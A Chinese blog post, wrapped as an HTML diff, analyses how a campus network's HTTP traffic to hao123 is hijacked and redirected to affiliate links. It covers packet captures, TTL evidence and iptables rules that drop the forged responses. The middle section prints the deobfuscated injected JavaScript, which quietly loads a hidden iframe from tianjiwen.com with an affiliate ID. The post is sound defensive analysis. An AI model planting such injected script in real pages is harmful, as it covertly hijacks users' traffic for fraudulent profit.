@@ -1,0 +1,74 @@
+<!doctype html><html lang=zh-cn><title>研究学校网络 hao123 被挟持的问题 - imlonghao</title><meta name=description content="前几个星期，在学校贴吧看到了有校园网用户反应 hao123 无法打开，目测存在循环重定向的问题：[校园网他妈的是被劫持了吗"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=renderer content="webkit"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><link rel=dns-prefetch href=//vip1.loli.net><link rel=stylesheet href=/static/hw3x7x.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css integrity="sha256-GxdCIOyfxQ1OBfS99qAIJDoGK1ADuBsxhMTqXG82fAY=" crossorigin=anonymous><script src=/static/hw3x7x.js async></script><script src=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js integrity="sha256-LVaMHPQ2zLqOc5rXSAfr4d1PIkEGNLyyUTDNPZmTtUw=" crossorigin=anonymous></script><script src=//instant.page/3.0.0 type=module defer integrity=sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1></script><link rel=alternate type=application/rss+xml title="imlonghao Feed" href=https://imlonghao.com/feed.xml><div id=container><div id=header><div id=post-nav><a href=./>Home</a>
+&nbsp;»&nbsp;
+<a href=./31.html>研究学校网络 hao123 被挟持的问题</a></div></div><div class=clearfix></div><div id=title>研究学校网络 hao123 被挟持的问题</div><div id=content class=markdown-body><h2>片头</h2><p>前几个星期，在贴吧看到了有校园网用户反应 hao123 无法打开，目测存在循环重定向的问题：<a href=http://tieba.baidu.com/p/4139149654 rel=nofollow>校园网他妈的是被劫持了吗？？打开 hao123 无限跳转</a><p>在文章最前面，讲一下本文的测试环境：<p>位置：校园网宿舍（电信出口）<p>系统：Archlinux<h2>初步测试</h2><p>经过了本人的测试，挟持问题存在，但循环重定向导致不能打开的问题难以复现。<p>当用户直接打开 <code>http://www.hao123.com/</code> 的时候，根据浏览器的不同，<strong>正常情况下</strong>，普通浏览器来说是会跳转到 <code>https://www.hao123.com/</code> 的，少数部分浏览器是会直接返回 <code>HTTP/1.1 200 OK</code> 直接返回网页，不过这也是正常的。<p>经过多次测试，在挟持的情况下，最终用户会被跳转到两个不同的推广地址。经过网上的搜索核实， <code>?tn=????????_hao_pg</code> 为 hao123 的推广地址，也就是说，你的每一次访问，某些人都会从中获利。<p>挟持的推广地址如下：<pre><code>http://www.hao123.com/?tn=90049484_hao_pg
+http://www.hao123.com/?tn=99945998_hao_pg
+</code></pre><h2>深入研究</h2><h3>burpsuite 暴力测试</h3><p>通过 burpsuite 连续发 100 个 HTTP 包，我发现挟持是随机的。<p>有时候连续几个包都是正常包，有时候连续几个包都是挟持包，甚至有时候只有一个正常包，然后上下有 N 个挟持包。（反正我没发现规律<p>在多次测试之下，我发现在不同的情况下，总共会有三个不同的挟持包。<p>为了给大家一个直观的感觉，我将这三个挟持包都上传到了我的网站。其中，第二个我访问的地址是 <code>/?tn=0</code><pre><code>https://paste.ubuntu.com/p/dBjX9qt24D/
+https://paste.ubuntu.com/p/bMCQdtkRfS/
+https://paste.ubuntu.com/p/BnXy37J3P8/
+</code></pre><p>三个挟持包，第 1 和第 2 个基本上是相同的，唯一的区别在于第二个还设置了 Cookies 。我姑且将前面两个包归为一类，两种挟持包的制作不一，可以看到应该是出自不同人之手。<p>前者的代码经过混淆，不过很容易被网上的工具所解密。解密之后的代码如下：<pre><code class=language-javascript>(function(r, o, k, v) {
+  r.onerror = function() {
+    return !0;
+  };
+  var i = 0,
+    da = o.getElementById(&quot;d&quot;),
+    db = da.scrollWidth,
+    dt = parseInt(db / 200),
+    de = function(n) {
+      var c = n.charAt(0) * 1;
+      if (isNaN(c)) return &quot;&quot;;
+      c = n.substr(1, c) * 1;
+      if (isNaN(c)) return &quot;&quot;;
+      var l = n.length,
+        t = [],
+        a,
+        f,
+        b,
+        e = String(c).length + 1,
+        m = function(d) {
+          return k.indexOf(n.charAt(d));
+        },
+        i = k.length;
+      if (l != e + c) return &quot;&quot;;
+      while (e &lt; l) {
+        a = m(e++);
+        if (a &lt; 5) f = a * i + m(e);
+        else f = (a - 5) * i * i + m(e) * i + m((e += 1));
+        t[t.length] = String.fromCharCode(f);
+        e++;
+      }
+      return t.join(&quot;&quot;);
+    },
+    tn = de(v),
+    pu = function() {
+      if (i &lt;= db) {
+        da.innerHTML = &quot;&lt;div id='c' style='width:&quot; + i + &quot;px;'&gt;&lt;!----&gt;&lt;/div&gt;&quot;;
+        setTimeout(pu, dt);
+      } else {
+        da.innerHTML = &quot;&lt;div id='c' style='width:100%'&gt;&lt;!----&gt;&lt;/div&gt;&quot;;
+        ~(function(a) {
+          a.style.display = &quot;none&quot;;
+          a.src = &quot;http://www.tianjiwen.com/hao/?tn=&quot; + tn;
+          da.insertBefore(a, null);
+        })(o.createElement(&quot;iframe&quot;));
+      }
+      i = i + 10;
+    };
+  pu();
+})(
+  self,
+  document,
+  &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;,
+  &quot;230CFCFCFCACBCFCFCEDREADTEHDREIDZ&quot;
+);
+</code></pre><p>唯一有用的东西就是 <code>tianjiwen.com</code>，不过域名似乎是虚假信息注册的。<pre><code>Registrant Street: china
+Registrant City: dexin
+Registrant State/Province: zhangye
+Registrant Email: xajh8888@gmail.com
+</code></pre><p>再来看另外一个，没有混淆，意图直截了当，就是让你跳转到他的地址上。<p>因此可以判断，前者挟持包所对应的推广地址是 <code>http://www.hao123.com/?tn=99945998_hao_pg</code> ，后者挟持包对应的推广地址是 <code>http://www.hao123.com/?tn=99945998_hao_pg</code><h3>神奇的参数</h3><p>经过测试，当然上面我也有所提及，当 GET 的地址存在一个参数时，经过测试无论是什么参数都好（例：<code>http://www.hao123.com/?a</code> 或 <code>http://www.hao123.com/?a=1</code>），只要参数存在，就会返回 <code>hijacking-2.txt</code> 这个挟持包。<p>这样的话就不难推断出用户反映的循环重定向的问题了。<p>直接访问 <code>http://www.hao123.com</code> ，被挟持到 <code>http://www.hao123.com/?tn=90049484_hao_pg</code> ，连接存在参数，跳转 <code>http://www.hao123.com/?tn=99945998_hao_pg</code> ，然后出于某种原因，两个推广直接撕逼，然后导致循环重定向，打不开 hao123 的问题。<h3>wireshark 抓包</h3><p><img src=https://vip1.loli.net/2019/12/26/Wxz8dNKVP5skqec.png alt=hijacking-1><p>这里抓到的包是 <code>hijacking-3.txt</code> 的包，也就是跳转到 <code>90049484</code> 的包。<p>简单分析一下，52-54 是 TCP 三次握手，握手成功后，55 本地提出了这个请求，然后 56 就收到了回复，不过是挟持包的。另外，58 同样也是挟持包，而真正的包在 63 的位置。<p>通过看 TTL ，我们也看出了异常。<p>53 中回复我们 SYN,ACK 的 TTL 是 47 ，这和我们 ping 目标主机得到的结果是一样的，基本断定这个是真实的。然而 55 / 58 中回复我们的 TTL 却是 210 ，这显然不是我们想要的结果。<p>然后通过 <code>tcp.stream eq 2</code> 过滤显示结果<hr><p><img src=https://vip1.loli.net/2019/12/26/Xp3KOybP8otIvL7.png alt=hijacking-2><p>这里抓到的包是 <code>hijacking-[1|2].txt</code> 的包，也就是跳转到 <code>99945998</code> 的包。<p>前面的握手我就不多说了，大体和上面一样，这次和上面不同的是。11 的 tcp-flags 是 <code>FIN,PSH,ACK</code> ，比上面的多了一个 <code>PSH</code> 。<p>在网上找到的解释：<blockquote><p>Push flag is used to push the data without any intermediate
+buffering(storing)</blockquote><p>摘自：<a href=https://packetcrafter.wordpress.com/2011/02/13/tcp-flags-hackers-playground/ rel=nofollow>TCP flags: Hackers Playground | Packet Crafter</a><p>大概的作用除了标记有数据传输之外，还有一个加速传输的作用，目的应该就是为了让这个挟持包比正确包更快的到达用户电脑。<p>同样，这次的正常包比挟持包慢了，因此又被落在了后面。<p>另外值得一提的是，这次的挟持包 TTL 是 57 ，因此我不负责任的判定是有两台不同的设备在搞鬼。<p>然后通过 <code>tcp.stream eq 1</code> 过滤显示结果<h2>解决方案</h2><h3>使用 HTTPS</h3><p>将 <code>https://www.hao123.com/</code> 设置为主页<h3>逐个分析，逐个击破</h3><p>我们先对 <code>hijacking-3.txt</code> 进行分析，观察他返回的 HTTP headers 头，有一个很明显的特征，并且经过多日的实验，他都是不变的，那就是他的 Server 名<pre><code>Server: c7#|&lt;J
+</code></pre><p>线上部署的时候，我想应该没有人会用这个作为自己 web 容器的名字的。<p>因此，我们可以用这个作为关键词，在 iptables 中进行关键字的 DROP<pre><code>sudo iptables -A INPUT -p tcp --sport 80 -m string --string &quot;Server: c7#|&lt;J&quot; --algo bm -j DROP
+</code></pre><p>如果是路由器设置的话需要把 <code>INPUT</code> 改成 <code>FORWARD</code><p>设置规则后，经过多次测试，后者的挟持已经不会再影响到我们了。<p>直接访问 <code>http://www.hao123.com/</code> 已经可以<p><img src=https://vip1.loli.net/2019/12/26/ZViwm1LoXk38lDW.png alt=hijacking-3><hr><p>接下来到另外一个挟持包，这种的话，特征也是有的，那就是他设置的 <code>qh[360]=1</code> ，我至今也不知道他设置这个用意何在，是为了嫁祸给数字公司吗？<p>结合他独特的 <code>PSH</code> 标签，我们可以设置这样的 iptables 规则<pre><code>sudo iptables -A INPUT -p tcp --sport 80 -m string --string &quot;qh[360]=1&quot; --algo bm --tcp-flags FIN,PSH,ACK FIN,PSH,ACK -j DROP
+</code></pre><p>至此，问题解决！<h3>总结</h3><p>1、设置 <code>https://www.hao123.com</code> 为首页<p>2、设置 iptables 规则如下：<pre><code>sudo iptables -A INPUT -p tcp --sport 80 -m string --string &quot;Server: c7#|&lt;J&quot; --algo bm -j DROP
+sudo iptables -A INPUT -p tcp --sport 80 -m string --string &quot;qh[360]=1&quot; --algo bm --tcp-flags FIN,PSH,ACK FIN,PSH,ACK -j DROP
+</code></pre><p>路由器设置的话，将 <code>INPUT</code> 改为 <code>FORWARD</code><p><img src=https://vip1.loli.net/2019/12/26/baYsJPXicuST3qo.png alt=hijacking-4><h2>写在最后</h2><p>由于本人技术有限，部分地方可能有纰漏，敬请指出！</div></div><div id=disqus_thread></div><div id=footer><span>Copyright © 2015 - 2020 imlonghao. Theme by
+<a href=http://simiki.org/ target=_blank rel="noopener noreferrer">Simiki</a>. CC BY-NC-SA 4.0</span></div><script src=https://cdn.jsdelivr.net/npm/cfga@1.0.3/cfga.min.js integrity="sha256-TXHTTKAPRQ9mgacgN+couk0xnzQ6uOXTZ5ojH1q6GUk=" crossorigin=anonymous></script><script src=https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.3.0/dist/lazyload.min.js integrity="sha256-bojBIKfs4l2WDcJODncBIGEe5fhU7/sM3zRO5/f2nqE=" crossorigin=anonymous async></script>
